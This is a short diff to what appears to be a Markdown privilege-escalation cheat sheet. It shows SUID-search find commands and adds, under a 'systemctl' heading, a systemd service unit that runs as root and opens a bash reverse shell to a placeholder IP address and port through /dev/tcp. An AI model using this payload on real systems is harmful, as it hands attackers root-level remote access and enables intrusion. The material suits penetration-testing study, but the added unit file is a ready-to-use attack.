@@ -14,7 +14,16 @@ find / -user root -perm -4000 -exec ls -ldb {} \;
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-## Abusing systemctl
+## systemctl
 
 #### Reverse shell to root user
+
+```
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<IP ADDRESS>/<PORT> 0>&1"
+```
+
+
 
